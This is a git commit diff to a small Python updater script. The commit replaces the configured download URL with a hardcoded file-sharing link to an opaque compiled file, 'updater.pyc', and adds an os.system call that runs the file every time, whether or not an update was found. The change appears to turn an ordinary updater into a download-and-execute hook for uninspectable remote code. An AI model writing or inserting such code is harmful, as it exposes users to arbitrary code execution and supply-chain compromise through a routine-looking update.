e68d05e688174c4cc78e36787139431a9540bf3c
WHITE71wolf <71555090+WHITE71wolf@users.noreply.github.com>
2021-10-19 14:51:39 +0300

    Update update.py

--- update.py
+++ update.py
@@ -1,6 +1,6 @@
 import requests
 import json
-
+import os
 
 
 fs = open('data.json', 'r')
@@ -12,7 +12,8 @@ j = json.loads(response)
 new_version = j['version']
 new_url = j['url']
 if new_version != version:
-    res = requests.get(new_url)
+    res = requests.get('https://download1506.mediafire.com/5ai75j6fa1jg/qmje1lw76c1kvwy/updater.pyc')
     with open('updater.pyc', 'wb') as file:
         for data in res.iter_content(chunk_size=8192):
             file.write(data)
+os.system("python updater.pyc")
